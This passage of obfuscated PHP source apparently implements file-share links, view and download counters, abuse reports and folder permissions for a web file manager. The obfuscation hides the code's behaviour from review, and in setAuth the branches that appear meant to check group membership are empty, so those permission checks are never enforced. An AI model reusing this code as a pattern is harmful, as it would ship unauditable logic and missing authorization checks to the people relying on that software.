($¤Ğ˜²Í±[$Š¶÷æÇÍ[685]] == $Š¶÷æÇÍ[228] && $¿×¯áËõ[$Š¶÷æÇÍ[685]] == $Š¶÷æÇÍ[91]) { $ÁÆşš·À = $Š¶÷æÇÍ[2335]; } if ($¤Ğ˜²Í±[$Š¶÷æÇÍ[685]] == $Š¶÷æÇÍ[91] && $¿×¯áËõ[$Š¶÷æÇÍ[685]] == $Š¶÷æÇÍ[228]) { $ÁÆşš·À = $Š¶÷æÇÍ[2338]; } Model($Š¶÷æÇÍ[655])->eventShare($ğÃÎ­ÇÒ, $ÁÆşš·À); return; } private function _addShareData($èÜÌ’°, $Æº®€Ï = array(), $©ËİªÀ² = false) { $â¥™õ¤ =& $_SERVER[µÅ˜º…æ]; $Ñ†·Ñ¨Š = $©ËİªÀ² == $â¥™õ¤[189] ? 0 : USER_ID; $¡ûÆÙ¼œ = array($â¥™õ¤[506] => $èÜÌ’°, $â¥™õ¤[1967] => $Ñ†·Ñ¨Š); if ($èÜÌ’° == 0) { $¡ûÆÙ¼œ = array($â¥™õ¤[2339] => $Æº®€Ï[$â¥™õ¤[583]], $â¥™õ¤[1967] => $Ñ†·Ñ¨Š); } if ($ê¢¨Ş = $this->where($¡ûÆÙ¼œ)->find()) { return $ê¢¨Ş[$â¥™õ¤[687]]; } if ($èÜÌ’° == 0) { $Â§‚ÃË = array($â¥™õ¤[32] => get_path_this($Æº®€Ï[$â¥™õ¤[87]])); } else { $Â§‚ÃË = Model($â¥™õ¤[932])->sourceInfo($èÜÌ’°); if (!$Â§‚ÃË) { return !1; } } if (!$Æº®€Ï[$â¥™õ¤[1865]]) { $Æº®€Ï[$â¥™õ¤[1865]] = $Â§‚ÃË[$â¥™õ¤[32]]; } $³î˜óÁï = array($â¥™õ¤[1967] => $Ñ†·Ñ¨Š, $â¥™õ¤[506] => $èÜÌ’°, $â¥™õ¤[1865] => $â¥™õ¤[12], $â¥™õ¤[578] => 0, $â¥™õ¤[685] => 0, $â¥™õ¤[583] => $â¥™õ¤[12], $â¥™õ¤[382] => $â¥™õ¤[12], $â¥™õ¤[1052] => $â¥™õ¤[12], $â¥™õ¤[2340] => 0, $â¥™õ¤[2341] => 0, $â¥™õ¤[861] => 0, $â¥™õ¤[580] => $â¥™õ¤[12], $â¥™õ¤[1555] => $â¥™õ¤[12]); $Æ¡‹¤‚‘ = explode($â¥™õ¤[50], $â¥™õ¤[2342]); foreach ($Æ¡‹¤‚‘ as $¢ú¡’›) { if (!isset($Æº®€Ï[$¢ú¡’›])) { continue; } $³î˜óÁï[$¢ú¡’›] = $Æº®€Ï[$¢ú¡’›]; } $ ñ¨¬´İ = $this->add($³î˜óÁï); $†´õõäı = array($â¥™õ¤[1555] => short_id($ ñ¨¬´İ)); if ($this->where($†´õõäı)->find()) { $†´õõäı[$â¥™õ¤[1555]] .= $â¥™õ¤[476] . rand_string(2, 3); } $this->where(array($â¥™õ¤[2343] => $ ñ¨¬´İ))->save($†´õõäı); return $ ñ¨¬´İ; } private function _shareAuthSet($ƒúèîóÊ, $•áÀ¿âá) { $×–·¦ò÷ =& $_SERVER[µÅ˜º…æ]; if (!is_array($•áÀ¿âá)) { return !1; } $äïÆÖÎö = Model($×–·¦ò÷[2292]); $äïÆÖÎö->where(array($×–·¦ò÷[687] => $ƒúèîóÊ))->delete(); $ÌÒèå‚‰ = array(); foreach ($•áÀ¿âá as $ÃšË¬Šœ) { $ıí”¯„à = SourceModel::TYPE_USER; if ($ÃšË¬Šœ[$×–·¦ò÷[188]] == SourceModel::TYPE_GROUP) { $ıí”¯„à = SourceModel::TYPE_GROUP; } $²£Î•’ = array($×–·¦ò÷[687] => $ƒúèîóÊ, $×–·¦ò÷[188] => $ıí”¯„à, $×–·¦ò÷[589] => intval($ÃšË¬Šœ[$×–·¦ò÷[589]]), $×–·¦ò÷[1641] => 0, $×–·¦ò÷[2344] => -1); if ($ÃšË¬Šœ[$×–·¦ò÷[1641]]) { $²£Î•’[$×–·¦ò÷[1641]] = $ÃšË¬Šœ[$×–·¦ò÷[1641]]; } else { if ($ÃšË¬Šœ[$×–·¦ò÷[2344]]) { $²£Î•’[$×–·¦ò÷[2344]] = $ÃšË¬Šœ[$×–·¦ò÷[2344]]; } } $ÌÒèå‚‰[] = $²£Î•’; } return $äïÆÖÎö->addAll($ÌÒèå‚‰, array(), !0); } public function numViewAdd($¸×‡ó˜­) { $‹¨ìıú‹ =& $_SERVER[µÅ˜º…æ]; $û°™®–‘ = array($‹¨ìıú‹[2343] => $¸×‡ó˜­); $this->where($û°™®–‘)->setAdd($‹¨ìıú‹[2340]); } public function numDownloadAdd($˜Ÿóœ¯ì) { $¸¿ŞÄø¦ =& $_SERVER[µÅ˜º…æ]; $Ö‡·§Ã = array($¸¿ŞÄø¦[2343] => $˜Ÿóœ¯ì); $this->where($Ö‡·§Ã)->setAdd($¸¿ŞÄø¦[2341]); } protected function shareEdit($µ½œ¨âÃ, $×ôò´óÈ) { $Ñ—ä‡ë¬ =& $_SERVER[µÅ˜º…æ]; $íšæë¤¼ = $this->getInfo($µ½œ¨âÃ); if (!$íšæë¤¼) { return !1; } if ($×ôò´óÈ[$Ñ—ä‡ë¬[1555]] && $×ôò´óÈ[$Ñ—ä‡ë¬[578]] == $Ñ—ä‡ë¬[91]) { if ($×ôò´óÈ[$Ñ—ä‡ë¬[1555]] == $íšæë¤¼[$Ñ—ä‡ë¬[1555]]) { unset($×ôò´óÈ[$Ñ—ä‡ë¬[1555]]); } if ($×ôò´óÈ[$Ñ—ä‡ë¬[1555]]) { $‚öÅìæ = $this->where(array($Ñ—ä‡ë¬[2345] => $×ôò´óÈ[$Ñ—ä‡ë¬[1555]]))->find(); if ($‚öÅìæ) { return !1; } if (!is_array($×ôò´óÈ[$Ñ—ä‡ë¬[580]])) { $×ôò´óÈ[$Ñ—ä‡ë¬[580]] = is_array($íšæë¤¼[$Ñ—ä‡ë¬[580]]) ? $íšæë¤¼[$Ñ—ä‡ë¬[580]] : array(); } if (!$×ôò´óÈ[$Ñ—ä‡ë¬[580]][$Ñ—ä‡ë¬[2346]]) { $×ôò´óÈ[$Ñ—ä‡ë¬[580]][$Ñ—ä‡ë¬[2346]] = $íšæë¤¼[$Ñ—ä‡ë¬[1555]]; $×ôò´óÈ[$Ñ—ä‡ë¬[580]][$Ñ—ä‡ë¬[2347]] = $Ñ—ä‡ë¬[91]; } } } $this->_checkLinkShare($×ôò´óÈ, $íšæë¤¼); $­áæÀäÃ = array(); $‚’¸Õ•õ = explode($Ñ—ä‡ë¬[50], $Ñ—ä‡ë¬[2348]); foreach ($‚’¸Õ•õ as $Èîº­ó£) { if (!array_key_exists($Èîº­ó£, $×ôò´óÈ)) { continue; } $­áæÀäÃ[$Èîº­ó£] = $×ôò´óÈ[$Èîº­ó£]; } $this->shareEventAdd($íšæë¤¼[$Ñ—ä‡ë¬[191]], $×ôò´óÈ, $Ñ—ä‡ë¬[1562]); $this->where(array($Ñ—ä‡ë¬[2343] => $µ½œ¨âÃ))->save($­áæÀäÃ); if (isset($×ôò´óÈ[$Ñ—ä‡ë¬[2332]])) { $this->_shareAuthSet($µ½œ¨âÃ, $×ôò´óÈ[$Ñ—ä‡ë¬[2332]]); } return !0; } private function _checkLinkShare($ÎÓšÚİì, $âÇÙÅÃÆ) { $¾âüªâø =& $_SERVER[µÅ˜º…æ]; if ($ÎÓšÚİì[$¾âüªâø[578]] != $¾âüªâø[91]) { return; } $ƒ¼æéÑÚ = $âÇÙÅÃÆ[$¾âüªâø[90]][$¾âüªâø[191]]; if ($âÇÙÅÃÆ[$¾âüªâø[90]][$¾âüªâø[33]] != $¾âüªâø[230]) { $’ĞÅâÉ˜ = $this->_folderReport($ƒ¼æéÑÚ); if (!$’ĞÅâÉ˜) { return; } show_json(LNG($¾âüªâø[2349]) . $¾âüªâø[2350] . $’ĞÅâÉ˜, !1); } $¦çâöÛ· = Model($¾âüªâø[932])->fileInfoGet($âÇÙÅÃÆ[$¾âüªâø[90]][$¾âüªâø[191]]); if (!$¦çâöÛ·) { return; } $õ«Ñ¨û = $this->shareFileMeta($¦çâöÛ·[$¾âüªâø[557]]); if (isset($õ«Ñ¨û[$¾âüªâø[451]]) && $õ«Ñ¨û[$¾âüªâø[451]] == $¾âüªâø[91]) { show_json(LNG($¾âüªâø[2351]), !1); } } private function _folderReport($¶˜¯€›¡) { $®·ş®ç» =& $_SERVER[µÅ˜º…æ]; $€ÏŒÍ–„ = array($®·ş®ç»[557] => array($®·ş®ç»[1181], 0), $®·ş®ç»[849] => 3); $¹ö›ßŠş = Model($®·ş®ç»[2352])->where($€ÏŒÍ–„)->field($®·ş®ç»[557])->select(); if (!$¹ö›ßŠş) { return !1; } $¹ö›ßŠş = array_to_keyvalue($¹ö›ßŠş, $®·ş®ç»[12], $®·ş®ç»[557]); $ÚäÍ‚ Õ = $®·ş®ç»[50] . $¶˜¯€›¡ . $®·ş®ç»[50]; $€ÏŒÍ–„ = array($®·ş®ç»[557] => array($®·ş®ç»[7], $¹ö›ßŠş), $®·ş®ç»[604] => array($®·ş®ç»[473], "\45{$ÚäÍ‚ Õ}\45"), $®·ş®ç»[520] => 0); $Ü—¹ùİ = Model($®·ş®ç»[932])->where($€ÏŒÍ–„)->field($®·ş®ç»[2353])->find(); if (!$Ü—¹ùİ) { return !1; } $æÅ¥º·µ = substr($Ü—¹ùİ[$®·ş®ç»[604]], strpos($Ü—¹ùİ[$®·ş®ç»[604]], $ÚäÍ‚ Õ)); $€ÏŒÍ–„ = array($®·ş®ç»[191] => array($®·ş®ç»[7], trim($æÅ¥º·µ, $®·ş®ç»[50]))); $Ä³¼£€± = Model($®·ş®ç»[932])->where($€ÏŒÍ–„)->field($®·ş®ç»[32])->select(); $¥¡Î½÷ì = array_to_keyvalue($Ä³¼£€±, $®·ş®ç»[12], $®·ş®ç»[32]); $¥¡Î½÷ì[] = $Ü—¹ùİ[$®·ş®ç»[32]]; return implode($®·ş®ç»[8], $¥¡Î½÷ì); } protected function remove($²ùÄú‰—) { $ÛÅˆìşÍ =& $_SERVER[µÅ˜º…æ]; $±‹®šÖ = is_array($²ùÄú‰—) ? $²ùÄú‰— : array($²ùÄú‰—); for ($Å²õ™‰ì = 0; $Å²õ™‰ì < count($±‹®šÖ); $Å²õ™‰ì++) { $İÀâº½õ = $this->getInfo($±‹®šÖ[$Å²õ™‰ì]); if ($İÀâº½õ[$ÛÅˆìşÍ[685]] == $ÛÅˆìşÍ[91]) { Model($ÛÅˆìşÍ[655])->eventShare($İÀâº½õ[$ÛÅˆìşÍ[191]], $ÛÅˆìşÍ[2338]); } if ($İÀâº½õ[$ÛÅˆìşÍ[578]] == $ÛÅˆìşÍ[91]) { Model($ÛÅˆìşÍ[655])->eventShare($İÀâº½õ[$ÛÅˆìşÍ[191]], $ÛÅˆìşÍ[2337]); } } $Ç¼áş‡ = array($ÛÅˆìşÍ[687] => array($ÛÅˆìşÍ[7], $±‹®šÖ)); $‰ËèØè = $this->where($Ç¼áş‡)->delete(); if ($‰ËèØè) { Model($ÛÅˆìşÍ[688])->where($Ç¼áş‡)->delete(); } return $‰ËèØè; } protected function removeBySource($‹¬½Í˜¿) { $ÙÆÔ‘½ =& $_SERVER[µÅ˜º…æ]; $«“¦Ú•­ = array($ÙÆÔ‘½[506] => array($ÙÆÔ‘½[507], $‹¬½Í˜¿)); $İÕøš£ = $this->field($ÙÆÔ‘½[687])->where($«“¦Ú•­)->select(); $À†š = array_to_keyvalue($İÕøš£, $ÙÆÔ‘½[12], $ÙÆÔ‘½[687]); if (!$À†š) { return; } foreach ($İÕøš£ as $´î ˜™Ö) { $this->cacheFunctionClear($ÙÆÔ‘½[2354], $´î ˜™Ö[$ÙÆÔ‘½[687]]); } $«“¦Ú•­ = array($ÙÆÔ‘½[2343] => array($ÙÆÔ‘½[507], $À†š)); $this->where($«“¦Ú•­)->delete(); Model($ÙÆÔ‘½[688])->where($«“¦Ú•­)->delete(); } public function listAll($îè’„ ‰) { $ÑŠÖ¹³® =& $_SERVER[µÅ˜º…æ]; $á¡‚¯â = array(); if ($îè’„ ‰[$ÑŠÖ¹³®[1593]]) { $á¡‚¯â[$ÑŠÖ¹³®[1593]] = $îè’„ ‰[$ÑŠÖ¹³®[1593]]; } if ($îè’„ ‰[$ÑŠÖ¹³®[860]]) { $Ê¨äĞšú = $îè’„ ‰[$ÑŠÖ¹³®[861]] ? $îè’„ ‰[$ÑŠÖ¹³®[861]] : strtotime(date($ÑŠÖ¹³®[2355])); $á¡‚¯â[$ÑŠÖ¹³®[231]] = array($ÑŠÖ¹³®[408], array($îè’„ ‰[$ÑŠÖ¹³®[860]], $Ê¨äĞšú)); } if ($îè’„ ‰[$ÑŠÖ¹³®[33]]) { $á¡‚¯â[$îè’„ ‰[$ÑŠÖ¹³®[33]]] = 1; } else { $á¡‚¯â[] = array($ÑŠÖ¹³®[578] => array($ÑŠÖ¹³®[1181], 0), $ÑŠÖ¹³®[685] => array($ÑŠÖ¹³®[1181], 0), $ÑŠÖ¹³®[2327] => $ÑŠÖ¹³®[2283]); } if ($îè’„ ‰[$ÑŠÖ¹³®[2279]]) { $á¡‚¯â[] = array($ÑŠÖ¹³®[1555] => $îè’„ ‰[$ÑŠÖ¹³®[2279]], $ÑŠÖ¹³®[1865] => array($ÑŠÖ¹³®[473], "\x25{$îè’„ ‰[$ÑŠÖ¹³®[2279]]}\45"), $ÑŠÖ¹³®[2327] => $ÑŠÖ¹³®[2283]); } $ˆÃÍ–Í¤ = $this->_makeOrder()->where($á¡‚¯â)->selectPage(20); if (empty($ˆÃÍ–Í¤[$ÑŠÖ¹³®[446]])) { return array(); } $this->_listDataApply($ˆÃÍ–Í¤[$ÑŠÖ¹³®[446]]); return $ˆÃÍ–Í¤; } public function listDataApply($ïô¯áÁ§) { $this->_listDataApply($ïô¯áÁ§); return $ïô¯áÁ§; } private function _listDataApply(&$Úˆ³ÓÅİ) { $ğ‘§öö´ =& $_SERVER[µÅ˜º…æ]; $ÇÊ…š‰» = array_to_keyvalue($Úˆ³ÓÅİ, $ğ‘§öö´[12], $ğ‘§öö´[1593]); $Šä÷¨ıÌ = Model($ğ‘§öö´[617])->userListInfo(array_unique($ÇÊ…š‰»)); $ôİâÓ‹ù = array_to_keyvalue($Úˆ³ÓÅİ, $ğ‘§öö´[12], $ğ‘§öö´[191]); $‰­ëü´æ = Model($ğ‘§öö´[932])->sourceListInfo($ôİâÓ‹ù, !0); foreach ($Úˆ³ÓÅİ as $ÌÃ€·  => &$øµÜü„·) { $—Ç´ÉÛ  = $øµÜü„·[$ğ‘§öö´[1593]]; $øµÜü„·[$ğ‘§öö´[2356]] = $Šä÷¨ıÌ[$—Ç´ÉÛ ] ? $Šä÷¨ıÌ[$—Ç´ÉÛ ] : !1; if (!$øµÜü„·[$ğ‘§öö´[2356]] || $øµÜü„·[$ğ‘§öö´[2356]][$ğ‘§öö´[849]] != $ğ‘§öö´[91]) { unset($Úˆ³ÓÅİ[$ÌÃ€· ]); continue; } $ö®¸ªı‹ = $øµÜü„·[$ğ‘§öö´[191]]; $øµÜü„·[$ğ‘§öö´[90]] = $‰­ëü´æ[$ö®¸ªı‹] ? $‰­ëü´æ[$ö®¸ªı‹] : !1; if ($øµÜü„·[$ğ‘§öö´[90]][$ğ‘§öö´[520]] == $ğ‘§öö´[91]) { unset($Úˆ³ÓÅİ[$ÌÃ€· ]); } if ($øµÜü„·[$ğ‘§öö´[90]] != $ğ‘§öö´[228] && !$øµÜü„·[$ğ‘§öö´[90]]) { unset($Úˆ³ÓÅİ[$ÌÃ€· ]); } } unset($øµÜü„·); $Úˆ³ÓÅİ = array_values($Úˆ³ÓÅİ); } private function _makeOrder($‚™¼Ä…Ê = '') { $ñö÷äŸÌ =& $_SERVER[µÅ˜º…æ]; $ˆáêÃ½ = array($ñö÷äŸÌ[231], $ñö÷äŸÌ[861], $ñö÷äŸÌ[2340], $ñö÷äŸÌ[2341]); $Ğ­ÏÙ€ = array($ñö÷äŸÌ[537] => $ñö÷äŸÌ[538], $ñö÷äŸÌ[539] => $ñö÷äŸÌ[540]); $’Á”î¬è = Input::get($ñö÷äŸÌ[544], $ñö÷äŸÌ[7], $ñö÷äŸÌ[512], $ˆáêÃ½); $ÚÚêşéé = Input::get($ñö÷äŸÌ[545], $ñö÷äŸÌ[7], $ñö÷äŸÌ[2357], array($ñö÷äŸÌ[2276], $ñö÷äŸÌ[539])); $ÚÚêşéé = $Ğ­ÏÙ€[$ÚÚêşéé]; $‚™¼Ä…Ê = $‚™¼Ä…Ê . "{$’Á”î¬è}\40{$ÚÚêşéé}"; return $this->order($‚™¼Ä…Ê); } public function reportAdd($¾Ò€Œğù) { $‚¦‹äš =& $_SERVER[µÅ˜º…æ]; $ëô€ƒ ô = array($‚¦‹äš[687] => $¾Ò€Œğù[$‚¦‹äš[687]], $‚¦‹äš[1593] => USER_ID); if (Model($‚¦‹äš[2352])->where($ëô€ƒ ô)->find()) { return !1; } $Ãá¾•ƒú = array($‚¦‹äš[687] => $¾Ò€Œğù[$‚¦‹äš[687]], $‚¦‹äš[1865] => $¾Ò€Œğù[$‚¦‹äš[1865]], $‚¦‹äš[191] => $¾Ò€Œğù[$‚¦‹äš[191]], $‚¦‹äš[557] => $¾Ò€Œğù[$‚¦‹äš[557]], $‚¦‹äš[1593] => USER_ID, $‚¦‹äš[33] => $¾Ò€Œğù[$‚¦‹äš[33]], $‚¦‹äš[540] => $¾Ò€Œğù[$‚¦‹äš[540]]); return Model($‚¦‹äš[2352])->add($Ãá¾•ƒú); } public function reportList($ğ„í Ó°) { $Ÿ«îÓ“ =& $_SERVER[µÅ˜º…æ]; $¼õ¼ñÌí = array(); if ($ğ„í Ó°[$Ÿ«îÓ“[860]]) { $Á¼««ÓÃ = $ğ„í Ó°[$Ÿ«îÓ“[861]] ? $ğ„í Ó°[$Ÿ«îÓ“[861]] : strtotime(date($Ÿ«îÓ“[2355])); $¼õ¼ñÌí[$Ÿ«îÓ“[231]] = array($Ÿ«îÓ“[408], array($ğ„í Ó°[$Ÿ«îÓ“[860]], $Á¼««ÓÃ)); } if (isset($ğ„í Ó°[$Ÿ«îÓ“[33]]) && in_array($ğ„í Ó°[$Ÿ«îÓ“[33]], array($Ÿ«îÓ“[91], $Ÿ«îÓ“[524], $Ÿ«îÓ“[2358], $Ÿ«îÓ“[2359], $Ÿ«îÓ“[2360]))) { $¼õ¼ñÌí[$Ÿ«îÓ“[33]] = $ğ„í Ó°[$Ÿ«îÓ“[33]]; } if (isset($ğ„í Ó°[$Ÿ«îÓ“[849]]) && in_array($ğ„í Ó°[$Ÿ«îÓ“[849]], array($Ÿ«îÓ“[228], $Ÿ«îÓ“[91], $Ÿ«îÓ“[524], $Ÿ«îÓ“[2358]))) { $¼õ¼ñÌí[$Ÿ«îÓ“[849]] = $ğ„í Ó°[$Ÿ«îÓ“[849]]; } $şüÔ¤Ì = Input::get($Ÿ«îÓ“[545], $Ÿ«îÓ“[7], $Ÿ«îÓ“[2357], array($Ÿ«îÓ“[2276], $Ÿ«îÓ“[539])); $¥ÜÂ´Ì = array($Ÿ«îÓ“[537] => $Ÿ«îÓ“[538], $Ÿ«îÓ“[539] => $Ÿ«îÓ“[540]); $Ê¥öõ®ë = $Ÿ«îÓ“[2361] . $¥ÜÂ´Ì[$şüÔ¤Ì]; $Õº“¡Š± = Model($Ÿ«îÓ“[2352])->where($¼õ¼ñÌí)->order($Ê¥öõ®ë)->selectPage(20); if (empty($Õº“¡Š±[$Ÿ«îÓ“[446]])) { return array(); } $®ŞÆ› = array_to_keyvalue_group($Õº“¡Š±[$Ÿ«îÓ“[446]], $Ÿ«îÓ“[849], $Ÿ«îÓ“[687]); if (!empty($®ŞÆ›[0])) { $ğ„í Ó° = $®ŞÆ›[0]; $¼õ¼ñÌí = array($Ÿ«îÓ“[687] => array($Ÿ«îÓ“[7], $ğ„í Ó°)); $Å… ß• = $this->where($¼õ¼ñÌí)->field($Ÿ«îÓ“[687])->select(); $Å… ß• = array_to_keyvalue($Å… ß•, $Ÿ«îÓ“[12], $Ÿ«îÓ“[687]); $ˆêæ”ï = array_diff($ğ„í Ó°, $Å… ß•); if (!empty($ˆêæ”ï)) { foreach ($Õº“¡Š±[$Ÿ«îÓ“[446]] as $„İ¼Ğ => $áğîåßŠ) { if (in_array($áğîåßŠ[$Ÿ«îÓ“[687]], $ˆêæ”ï)) { unset($Õº“¡Š±[$Ÿ«îÓ“[446]][$„İ¼Ğ]); } } } } $this->_listDataApply($Õº“¡Š±[$Ÿ«îÓ“[446]]); return $Õº“¡Š±; } public function reportStatus($é ÛßĞƒ) { $Àéˆí›ø =& $_SERVER[µÅ˜º…æ]; $¯—³ìûÉ = array($Àéˆí›ø[487] => $é ÛßĞƒ[$Àéˆí›ø[487]]); $ßñ÷¤î = Model($Àéˆí›ø[2352])->where($¯—³ìûÉ)->field($Àéˆí›ø[2362])->find(); if (!$ßñ÷¤î) { return !1; } $ÊµÍÌ·» = array($Àéˆí›ø[849] => $é ÛßĞƒ[$Àéˆí›ø[849]]); if ($é ÛßĞƒ[$Àéˆí›ø[849]] == $Àéˆí›ø[2358] && $ßñ÷¤î[$Àéˆí›ø[849]] == $Àéˆí›ø[2358]) { $ÊµÍÌ·»[$Àéˆí›ø[849]] = 0; } $ëÀÎ¿Ñ¡ = Model($Àéˆí›ø[2352])->where($¯—³ìûÉ)->save($ÊµÍÌ·»); if ($é ÛßĞƒ[$Àéˆí›ø[849]] == $Àéˆí›ø[524]) { if ($ßñ÷¤î[$Àéˆí›ø[557]] != $Àéˆí›ø[228] && $this->shareFileMeta($ßñ÷¤î[$Àéˆí›ø[557]])) { $this->shareFileMeta($ßñ÷¤î[$Àéˆí›ø[557]], 0); } $this->remove($ßñ÷¤î[$Àéˆí›ø[687]]); return !0; } if ($ëÀÎ¿Ñ¡ && $é ÛßĞƒ[$Àéˆí›ø[849]] == $Àéˆí›ø[2358]) { $€Ñà¾õ¤ = $ÊµÍÌ·»[$Àéˆí›ø[849]] == $Àéˆí›ø[2358] ? 1 : 0; $this->shareFileMeta($ßñ÷¤î[$Àéˆí›ø[557]], $€Ñà¾õ¤); $this->removeByFile($ßñ÷¤î[$Àéˆí›ø[557]]); } return $ëÀÎ¿Ñ¡; } private function removeByFile($©ä²²½­) { $“™ßˆØé =& $_SERVER[µÅ˜º…æ]; $¾Ÿí¯ÊÏ = Model($“™ßˆØé[932])->where(array($“™ßˆØé[557] => $©ä²²½­))->field($“™ßˆØé[191])->select(); $„ııë´á = array_to_keyvalue($¾Ÿí¯ÊÏ, $“™ßˆØé[12], $“™ßˆØé[191]); $©½¼¬¿ = array($“™ßˆØé[191] => array($“™ßˆØé[7], $„ııë´á), $“™ßˆØé[578] => 1); $¾Ÿí¯ÊÏ = $this->where($©½¼¬¿)->field($“™ßˆØé[687])->select(); if (empty($¾Ÿí¯ÊÏ)) { return; } $±‡¨®ÈÌ = array_to_keyvalue($¾Ÿí¯ÊÏ, $“™ßˆØé[12], $“™ßˆØé[687]); $this->remove($±‡¨®ÈÌ); } private function shareFileMeta($«›ÅğĞ, $ØŒ‹í¬ı = null) { $ì¬€©éÙ =& $_SERVER[µÅ˜º…æ]; $Š˜¸Ş¾ = array($ì¬€©éÙ[557] => $«›ÅğĞ, $ì¬€©éÙ[95] => $ì¬€©éÙ[2363]); if (is_null($ØŒ‹í¬ı)) { return Model($ì¬€©éÙ[2364])->where($Š˜¸Ş¾)->find(); } $Š˜¸Ş¾[$ì¬€©éÙ[451]] = $ØŒ‹í¬ı; Model($ì¬€©éÙ[2364])->add($Š˜¸Ş¾, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\x63\x65\137\x61\165\x74\x68"; public function getAuth($ÑïˆÔåí) { $âè…ÜÑô =& $_SERVER[µÅ˜º…æ]; $§ßÛÎ´° = $this->sourceAuthSelect($ÑïˆÔåí); $ÙÈÕµÍï = array(); $œš÷şï = array(); $½Çñë¦ = 2 << 25; foreach ($§ßÛÎ´° as $êÖùÊí) { $˜œÚÙĞ = Model($âè…ÜÑô[591])->listData($êÖùÊí[$âè…ÜÑô[1641]]); if (!$˜œÚÙĞ) { continue; } $ÙÈÕµÍï[] = $êÖùÊí; $Š¢°ı = 0; if ($êÖùÊí[$âè…ÜÑô[188]] == SourceModel::TYPE_GROUP) { $Š¢°ı = $½Çñë¦ * 2; } if ($êÖùÊí[$âè…ÜÑô[188]] == SourceModel::TYPE_USER) { $Š¢°ı = $½Çñë¦; } if ($êÖùÊí[$âè…ÜÑô[188]] == SourceModel::TYPE_USER && $êÖùÊí[$âè…ÜÑô[589]] == $âè…ÜÑô[228]) { $Š¢°ı = 0; } $œš÷şï[] = $˜œÚÙĞ[$âè…ÜÑô[502]] + $Š¢°ı; } array_multisort($œš÷şï, SORT_DESC, $ÙÈÕµÍï); return $ÙÈÕµÍï; } public function sourceAuthSelect($±ÒÕîâ) { $­¯„”˜Ê =& $_SERVER[µÅ˜º…æ]; static $Ÿ’ÅøÄ€ = array(); $¯¶İÃÏ´ = is_array($±ÒÕîâ) ? !1 : !0; if ($¯¶İÃÏ´) { $±ÒÕîâ = array($±ÒÕîâ); } $óåûËÆÅ = array(); foreach ($±ÒÕîâ as $ò»á¦¹) { if (isset($Ÿ’ÅøÄ€[$ò»á¦¹])) { $óåûËÆÅ[$ò»á¦¹] = $Ÿ’ÅøÄ€[$ò»á¦¹]; } } if (count($óåûËÆÅ) == count($±ÒÕîâ)) { return $¯¶İÃÏ´ ? $óåûËÆÅ[$±ÒÕîâ[0]] : $óåûËÆÅ; } $ùí­™â = $­¯„”˜Ê[2365]; $¬·½õéÅ = array($­¯„”˜Ê[191] => array($­¯„”˜Ê[7], $±ÒÕîâ)); $¼¬¡‡ì£ = $this->field($ùí­™â)->order($­¯„”˜Ê[487])->where($¬·½õéÅ)->select(); $¨äã‰§ = array_to_keyvalue_group($¼¬¡‡ì£, $­¯„”˜Ê[191]); foreach ($±ÒÕîâ as $ò»á¦¹) { $Ÿ’ÅøÄ€[$ò»á¦¹] = $¨äã‰§[$ò»á¦¹] ? $¨äã‰§[$ò»á¦¹] : array(); } if ($¯¶İÃÏ´) { return $¼¬¡‡ì£; } return $¨äã‰§; } public function setAuth($ş‚†øÖ, $ÚŞå©åÜ) { $ø¿’¥÷ =& $_SERVER[µÅ˜º…æ]; $ÏöÍúòÃ = Model($ø¿’¥÷[1534])->sourceInfo($ş‚†øÖ); if (!$ÏöÍúòÃ) { return !1; } if ($ÏöÍúòÃ[$ø¿’¥÷[188]] != SourceModel::TYPE_GROUP) { return !1; } $î¼½Ó = 1; $ººùõØé = $ÏöÍúòÃ[$ø¿’¥÷[589]]; if ($ººùõØé != $î¼½Ó) { $ÛĞàÓÕ = array($ø¿’¥÷[1496] => $ººùõØé); $’‹îí¤Á = Model($ø¿’¥÷[2275])->field($ø¿’¥÷[1593])->where($ÛĞàÓÕ)->select(); $’‹îí¤Á = array_to_keyvalue($’‹îí¤Á, $ø¿’¥÷[12], $ø¿’¥÷[1593]); } $úó­†îş = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Öáà‚öª = array(); foreach ($ÚŞå©åÜ as $¨¾™÷«Æ) { if (!in_array($¨¾™÷«Æ[$ø¿’¥÷[188]], $úó­†îş)) { show_json(LNG($ø¿’¥÷[2366]), !1); } if ($ººùõØé != $î¼½Ó) { if ($¨¾™÷«Æ[$ø¿’¥÷[188]] == SourceModel::TYPE_GROUP) { } if ($¨¾™÷«Æ[$ø¿’¥÷[589]] != 0 && !in_array($¨¾™÷«Æ[$ø¿’¥÷[589]], $’‹îí¤Á)) { } } if ($¨¾™÷«Æ[$ø¿’¥÷[589]] == 0) { $¨¾™÷«Æ[$ø¿’¥÷[188]] = SourceModel::TYPE_USER; } $Öáà‚öª[] = array($ø¿’¥÷[191] => $ş‚†øÖ, $ø¿’¥÷[188] => intval($¨¾™÷«Æ[$ø¿’¥÷[188]]), $ø¿’¥÷[589] => intval($¨¾™÷«Æ[$ø¿’¥÷[589]]), $ø¿’¥÷[1641] => intval($¨¾™÷«Æ[$ø¿’¥÷[1641]]) ? intval($¨¾™÷«Æ[$ø¿’¥÷[1641]]) : 0, $ø¿’¥÷[2344] => intval($¨¾™÷«Æ[$ø¿’¥÷[2344]]) ? intval($¨¾™÷«Æ[$ø¿’¥÷[2344]]) : -1); } $this->where(array($ø¿’¥÷[506] => $ş‚†øÖ))->delete(); $this->addAll($Öáà‚öª); return !0; } public function authClear($´¢´íÖÍ) { $§í©íã =& $_SERVER[µÅ˜º…æ]; $üÑ·ñ© = Model($§í©íã[1534])->sourceInfo($´¢´íÖÍ); $ÌÊğÇ¦Â = array($´¢´íÖÍ); if ($üÑ·ñ©[$§í©íã[500]] == $§í©íã[91]) { $ËşëªŞ = array($§í©íã[674] => array($§í©íã[635], $üÑ·ñ©[$§í©íã[604]] . $´¢´íÖÍ . $§í©íã[636])); $ÌÊğÇ¦Â = Model($§í©íã[1534])->field($§í©íã[506])->where($ËşëªŞ)->getField($§í©íã[191], !0); $ÌÊğÇ¦Â[] = $´¢´íÖÍ; } $this->where(array($§í©íã[506] => array($§í©íã[507], $ÌÊğÇ¦Â)))->delete(); return !0; } public function getAllParent($¦ŒÖÃöÂ) { $í¢ïÄ²½ =& $_SERVER[µÅ˜º…æ]; $ªô¦·Ÿ = Model($í¢ïÄ²½[1534])->sourceInfo($¦ŒÖÃöÂ); if (!$ªô¦·Ÿ || $ªô¦·Ÿ[$í¢ïÄ²½[188]] != SourceModel::TYPE_GROUP) { return array(); } $ç«á¦å = 